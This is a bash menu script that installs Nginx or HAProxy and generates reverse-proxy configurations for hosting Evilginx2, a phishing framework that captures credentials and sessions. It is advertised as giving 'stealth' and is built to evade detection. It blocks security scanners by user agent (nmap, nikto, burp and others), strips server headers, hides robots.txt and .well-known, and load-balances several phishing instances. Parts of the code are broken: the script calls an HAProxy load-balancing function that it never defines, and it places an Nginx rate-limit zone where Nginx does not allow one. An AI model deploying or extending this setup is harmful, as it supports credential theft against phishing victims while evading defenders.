#!/bin/bash

# Reverse Proxy & Traffic Management for Evilginx2 v3.4.1
# Supports HAProxy and Nginx for advanced traffic routing and stealth

set -euo pipefail

# Configuration
CONFIG_FILE="config.conf"
LOG_FILE="logs/proxy_manager.log"
NGINX_CONF_DIR="/etc/nginx/sites-available"
NGINX_ENABLED_DIR="/etc/nginx/sites-enabled"
HAPROXY_CONF="/etc/haproxy/haproxy.cfg"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Logging function
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Load configuration
load_config() {
    if [[ -f "$CONFIG_FILE" ]]; then
        source "$CONFIG_FILE"
    else
        echo -e "${RED}Configuration file not found: $CONFIG_FILE${NC}"
        exit 1
    fi
}

# Install Nginx if not present
install_nginx() {
    if ! command -v nginx &> /dev/null; then
        log "Installing Nginx..."
        if [[ -f /etc/debian_version ]]; then
            apt-get update && apt-get install -y nginx
        elif [[ -f /etc/redhat-release ]]; then
            yum install -y nginx || dnf install -y nginx
        else
            log "Unsupported OS for automatic Nginx installation"
            exit 1
        fi
        systemctl enable nginx
    fi
}

# Install HAProxy if not present
install_haproxy() {
    if ! command -v haproxy &> /dev/null; then
        log "Installing HAProxy..."
        if [[ -f /etc/debian_version ]]; then
            apt-get update && apt-get install -y haproxy
        elif [[ -f /etc/redhat-release ]]; then
            yum install -y haproxy || dnf install -y haproxy
        else
            log "Unsupported OS for automatic HAProxy installation"
            exit 1
        fi
        systemctl enable haproxy
    fi
}

# Generate Nginx configuration for Evilginx2
generate_nginx_config() {
    local domain="$1"
    local evilginx_port="${2:-443}"
    local config_file="$NGINX_CONF_DIR/$domain"
    
    log "Generating Nginx configuration for $domain"
    
    cat > "$config_file" << EOF
# Nginx configuration for $domain - Evilginx2 Proxy
server {
    listen 80;
    server_name $domain;
    
    # Redirect HTTP to HTTPS
    return 301 https://\$server_name\$request_uri;
}

server {
    listen 443 ssl http2;
    server_name $domain;
    
    # SSL Configuration
    ssl_certificate /etc/ssl/certs/$domain/fullchain.pem;
    ssl_certificate_key /etc/ssl/private/$domain/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384;
    ssl_prefer_server_ciphers on;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 10m;
    
    # Security Headers
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options SAMEORIGIN always;
    add_header X-Content-Type-Options nosniff always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    
    # Hide server information
    server_tokens off;
    more_clear_headers Server;
    
    # Real IP handling
    real_ip_header X-Forwarded-For;
    set_real_ip_from 0.0.0.0/0;
    
    # Rate limiting
    limit_req_zone \$binary_remote_addr zone=login:10m rate=5r/m;
    limit_req zone=login burst=10 nodelay;
    
    # Logging
    access_log /var/log/nginx/$domain.access.log combined;
    error_log /var/log/nginx/$domain.error.log;
    
    # Proxy to Evilginx2
    location / {
        proxy_pass https://127.0.0.1:$evilginx_port;
        proxy_ssl_verify off;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
        proxy_set_header X-Forwarded-Host \$host;
        proxy_set_header X-Forwarded-Server \$host;
        
        # Websocket support
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection "upgrade";
        
        # Timeouts
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
        
        # Buffer settings
        proxy_buffering on;
        proxy_buffer_size 8k;
        proxy_buffers 8 8k;
        proxy_busy_buffers_size 16k;
    }
    
    # Block common scanners and bots
    location ~* /(\.well-known|robots\.txt|sitemap\.xml) {
        return 404;
    }
    
    # Block suspicious user agents
    if (\$http_user_agent ~* (nmap|nikto|sqlmap|nessus|openvas|w3af|burp|zap)) {
        return 444;
    }
    
    # Block suspicious requests
    location ~* \.(env|git|svn|htaccess|htpasswd)$ {
        return 444;
    }
}
EOF
    
    # Enable the site
    ln -sf "$config_file" "$NGINX_ENABLED_DIR/"
    
    log "Nginx configuration created for $domain"
}

# Generate HAProxy configuration for Evilginx2
generate_haproxy_config() {
    local domain="$1"
    local evilginx_port="${2:-443}"
    
    log "Generating HAProxy configuration for $domain"
    
    # Backup existing configuration
    cp "$HAPROXY_CONF" "$HAPROXY_CONF.backup.$(date +%s)"
    
    cat > "$HAPROXY_CONF" << EOF
# HAProxy configuration for Evilginx2 v3.4.1
global
    daemon
    chroot /var/lib/haproxy
    stats socket /run/haproxy/admin.sock mode 660 level admin
    stats timeout 30s
    user haproxy
    group haproxy
    
    # SSL/TLS Configuration
    ssl-default-bind-ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384
    ssl-default-bind-options ssl-min-ver TLSv1.2 no-tls-tickets
    ssl-default-server-ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384
    ssl-default-server-options ssl-min-ver TLSv1.2 no-tls-tickets
    
    # Tuning
    tune.ssl.default-dh-param 2048
    tune.bufsize 32768
    tune.maxrewrite 1024

defaults
    mode http
    timeout connect 5000ms
    timeout client 50000ms
    timeout server 50000ms
    option httplog
    option dontlognull
    option http-server-close
    option forwardfor
    option redispatch
    retries 3
    
    # Security
    option httpclose
    option abortonclose
    
    # Logging
    log global

# Frontend for HTTP (redirect to HTTPS)
frontend http_frontend
    bind *:80
    redirect scheme https code 301

# Frontend for HTTPS
frontend https_frontend
    bind *:443 ssl crt /etc/ssl/certs/$domain/combined.pem
    
    # Security headers
    http-response set-header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload"
    http-response set-header X-Frame-Options SAMEORIGIN
    http-response set-header X-Content-Type-Options nosniff
    http-response set-header X-XSS-Protection "1; mode=block"
    http-response set-header Referrer-Policy "strict-origin-when-cross-origin"
    
    # Hide server information
    http-response del-header Server
    
    # Rate limiting
    stick-table type ip size 100k expire 30s store http_req_rate(10s)
    http-request track-sc0 src
    http-request reject if { sc_http_req_rate(0) gt 20 }
    
    # Block suspicious user agents
    http-request deny if { req.hdr(user-agent) -m reg -i (nmap|nikto|sqlmap|nessus|openvas|w3af|burp|zap) }
    
    # ACL for domain matching
    acl is_$domain hdr(host) -i $domain
    
    # Route to backend
    use_backend evilginx_backend if is_$domain
    
    # Default action (block unknown domains)
    default_backend block_backend

# Backend for Evilginx2
backend evilginx_backend
    balance roundrobin
    option httpchk GET /
    
    # Server configuration
    server evilginx1 127.0.0.1:$evilginx_port check ssl verify none
    
    # Health check
    http-check expect status 200,301,302,401,403

# Backend for blocking unknown requests
backend block_backend
    http-request deny

# Statistics page (optional)
listen stats
    bind *:8404
    option httplog
    stats enable
    stats uri /stats
    stats refresh 30s
    stats admin if TRUE
    acl network_allowed src 127.0.0.1/32
    http-request deny unless network_allowed
EOF
    
    # Create combined certificate file for HAProxy
    mkdir -p "/etc/ssl/certs/$domain"
    if [[ -f "certs/$domain/fullchain.pem" && -f "certs/$domain/privkey.pem" ]]; then
        cat "certs/$domain/fullchain.pem" "certs/$domain/privkey.pem" > "/etc/ssl/certs/$domain/combined.pem"
        chmod 600 "/etc/ssl/certs/$domain/combined.pem"
    fi
    
    log "HAProxy configuration created for $domain"
}

# Setup load balancing for multiple Evilginx2 instances
setup_load_balancing() {
    local domain="$1"
    local proxy_type="$2"
    local instances="$3"
    
    log "Setting up load balancing for $domain with $instances instances"
    
    if [[ "$proxy_type" == "nginx" ]]; then
        setup_nginx_load_balancing "$domain" "$instances"
    elif [[ "$proxy_type" == "haproxy" ]]; then
        setup_haproxy_load_balancing "$domain" "$instances"
    fi
}

# Setup Nginx load balancing
setup_nginx_load_balancing() {
    local domain="$1"
    local instances="$2"
    
    cat > "$NGINX_CONF_DIR/$domain-lb" << EOF
upstream evilginx_backend {
    least_conn;
EOF
    
    for ((i=1; i<=instances; i++)); do
        local port=$((8443 + i))
        echo "    server 127.0.0.1:$port max_fails=3 fail_timeout=30s;" >> "$NGINX_CONF_DIR/$domain-lb"
    done
    
    cat >> "$NGINX_CONF_DIR/$domain-lb" << EOF
}

server {
    listen 443 ssl http2;
    server_name $domain;
    
    # SSL Configuration
    ssl_certificate /etc/ssl/certs/$domain/fullchain.pem;
    ssl_certificate_key /etc/ssl/private/$domain/privkey.pem;
    
    location / {
        proxy_pass https://evilginx_backend;
        proxy_ssl_verify off;
        proxy_set_header Host \$host;
        proxy_set_header X-Real-IP \$remote_addr;
        proxy_set_header X-Forwarded-For \$proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto \$scheme;
    }
}
EOF
    
    ln -sf "$NGINX_CONF_DIR/$domain-lb" "$NGINX_ENABLED_DIR/"
}

# Setup traffic monitoring
setup_monitoring() {
    local proxy_type="$1"
    
    log "Setting up traffic monitoring for $proxy_type"
    
    # Create monitoring script
    cat > "automation/traffic_monitor.sh" << 'EOF'
#!/bin/bash

LOGFILE="logs/traffic_monitor.log"

monitor_traffic() {
    while true; do
        timestamp=$(date '+%Y-%m-%d %H:%M:%S')
        
        # Monitor connections
        connections=$(netstat -an | grep :443 | grep ESTABLISHED | wc -l)
        
        # Monitor load
        load=$(uptime | awk -F'load average:' '{print $2}' | awk '{print $1}' | sed 's/,//')
        
        # Monitor memory
        memory=$(free | grep Mem | awk '{printf "%.1f", $3/$2 * 100.0}')
        
        echo "[$timestamp] Connections: $connections, Load: $load, Memory: ${memory}%" >> "$LOGFILE"
        
        sleep 60
    done
}

monitor_traffic &
EOF
    
    chmod +x "automation/traffic_monitor.sh"
}

# Test proxy configuration
test_proxy_config() {
    local proxy_type="$1"
    
    log "Testing $proxy_type configuration"
    
    if [[ "$proxy_type" == "nginx" ]]; then
        nginx -t
        if [[ $? -eq 0 ]]; then
            log "Nginx configuration test passed"
            return 0
        else
            log "Nginx configuration test failed"
            return 1
        fi
    elif [[ "$proxy_type" == "haproxy" ]]; then
        haproxy -c -f "$HAPROXY_CONF"
        if [[ $? -eq 0 ]]; then
            log "HAProxy configuration test passed"
            return 0
        else
            log "HAProxy configuration test failed"
            return 1
        fi
    fi
}

# Restart proxy service
restart_proxy() {
    local proxy_type="$1"
    
    log "Restarting $proxy_type service"
    
    if [[ "$proxy_type" == "nginx" ]]; then
        systemctl reload nginx
    elif [[ "$proxy_type" == "haproxy" ]]; then
        systemctl reload haproxy
    fi
    
    if [[ $? -eq 0 ]]; then
        log "$proxy_type restarted successfully"
    else
        log "Failed to restart $proxy_type"
    fi
}

# Show proxy status
show_status() {
    echo -e "${BLUE}=== Proxy Service Status ===${NC}"
    
    if systemctl is-active --quiet nginx; then
        echo -e "${GREEN}Nginx: Running${NC}"
    else
        echo -e "${RED}Nginx: Stopped${NC}"
    fi
    
    if systemctl is-active --quiet haproxy; then
        echo -e "${GREEN}HAProxy: Running${NC}"
    else
        echo -e "${RED}HAProxy: Stopped${NC}"
    fi
    
    echo
    echo "Active connections:"
    netstat -an | grep :443 | grep ESTABLISHED | wc -l
    
    echo
    echo "Recent access logs (last 10 entries):"
    tail -n 10 /var/log/nginx/access.log 2>/dev/null || echo "No Nginx logs found"
}

# Main menu
show_menu() {
    echo -e "${BLUE}=== Reverse Proxy Manager for Evilginx2 v3.4.1 ===${NC}"
    echo "1) Setup Nginx proxy"
    echo "2) Setup HAProxy proxy"
    echo "3) Setup load balancing"
    echo "4) Test configuration"
    echo "5) Restart services"
    echo "6) Show status"
    echo "7) Setup monitoring"
    echo "8) Exit"
    echo -n "Select option: "
}

# Main execution
main() {
    mkdir -p logs automation
    load_config
    
    while true; do
        show_menu
        read -r choice
        
        case $choice in
            1)
                echo -n "Enter domain: "
                read -r domain
                echo -n "Enter Evilginx2 port (default 443): "
                read -r port
                port=${port:-443}
                install_nginx
                generate_nginx_config "$domain" "$port"
                test_proxy_config "nginx" && restart_proxy "nginx"
                ;;
            2)
                echo -n "Enter domain: "
                read -r domain
                echo -n "Enter Evilginx2 port (default 443): "
                read -r port
                port=${port:-443}
                install_haproxy
                generate_haproxy_config "$domain" "$port"
                test_proxy_config "haproxy" && restart_proxy "haproxy"
                ;;
            3)
                echo -n "Enter domain: "
                read -r domain
                echo "1) Nginx"
                echo "2) HAProxy"
                echo -n "Select proxy type: "
                read -r proxy_choice
                echo -n "Enter number of instances: "
                read -r instances
                
                if [[ "$proxy_choice" == "1" ]]; then
                    setup_load_balancing "$domain" "nginx" "$instances"
                else
                    setup_load_balancing "$domain" "haproxy" "$instances"
                fi
                ;;
            4)
                echo "1) Test Nginx"
                echo "2) Test HAProxy"
                echo -n "Select proxy type: "
                read -r test_choice
                
                if [[ "$test_choice" == "1" ]]; then
                    test_proxy_config "nginx"
                else
                    test_proxy_config "haproxy"
                fi
                ;;
            5)
                echo "1) Restart Nginx"
                echo "2) Restart HAProxy"
                echo "3) Restart both"
                echo -n "Select option: "
                read -r restart_choice
                
                case $restart_choice in
                    1) restart_proxy "nginx" ;;
                    2) restart_proxy "haproxy" ;;
                    3) restart_proxy "nginx"; restart_proxy "haproxy" ;;
                esac
                ;;
            6)
                show_status
                ;;
            7)
                echo "1) Nginx monitoring"
                echo "2) HAProxy monitoring"
                echo -n "Select proxy type: "
                read -r monitor_choice
                
                if [[ "$monitor_choice" == "1" ]]; then
                    setup_monitoring "nginx"
                else
                    setup_monitoring "haproxy"
                fi
                ;;
            8)
                echo "Exiting..."
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid option${NC}"
                ;;
        esac
        echo
    done
}

# Run main function
main "$@"
